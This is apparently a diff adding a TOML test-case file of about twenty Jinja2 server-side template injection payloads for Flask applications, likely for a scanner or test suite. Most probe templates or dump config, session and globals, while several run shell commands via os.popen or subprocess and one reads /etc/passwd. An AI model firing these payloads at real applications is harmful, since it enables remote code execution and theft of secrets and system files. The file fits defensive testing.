@@ -1,0 +1,102 @@
+schema = 1
+# Jinja2 SSTI (Python Flask).
+
+[[case]]
+id = "arith_basic"
+class = "ssti"
+payload = "{{7*7}}"
+
+[[case]]
+id = "arith_complex"
+class = "ssti"
+payload = "{{7*'7'}}"
+
+[[case]]
+id = "config_dump"
+class = "ssti"
+payload = "{{config}}"
+
+[[case]]
+id = "config_items"
+class = "ssti"
+payload = "{{config.items()}}"
+
+[[case]]
+id = "self_dump"
+class = "ssti"
+payload = "{{self}}"
+
+[[case]]
+id = "self_namespace"
+class = "ssti"
+payload = "{{self.__dict__}}"
+
+[[case]]
+id = "request_environ"
+class = "ssti"
+payload = "{{request.environ}}"
+
+[[case]]
+id = "url_for_globals"
+class = "ssti"
+payload = "{{url_for.__globals__}}"
+
+[[case]]
+id = "subprocess_popen"
+class = "ssti"
+payload = "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0] }}"
+
+[[case]]
+id = "os_popen"
+class = "ssti"
+payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
+
+[[case]]
+id = "import_lookup"
+class = "ssti"
+payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
+
+[[case]]
+id = "lipsum_globals"
+class = "ssti"
+payload = "{{lipsum.__globals__}}"
+
+[[case]]
+id = "joiner_init"
+class = "ssti"
+payload = "{{joiner.__init__.__globals__}}"
+
+[[case]]
+id = "cycler_init"
+class = "ssti"
+payload = "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+
+[[case]]
+id = "namespace_init"
+class = "ssti"
+payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+
+[[case]]
+id = "g_environ"
+class = "ssti"
+payload = "{{g}}"
+
+[[case]]
+id = "session_dict"
+class = "ssti"
+payload = "{{session}}"
+
+[[case]]
+id = "request_args_dict"
+class = "ssti"
+payload = "{{request.args}}"
+
+[[case]]
+id = "filter_attribute"
+class = "ssti"
+payload = "{{ ''|attr('__class__')|attr('__mro__') }}"
+
+[[case]]
+id = "via_get_flashed"
+class = "ssti"
+payload = "{{ get_flashed_messages.__globals__ }}"
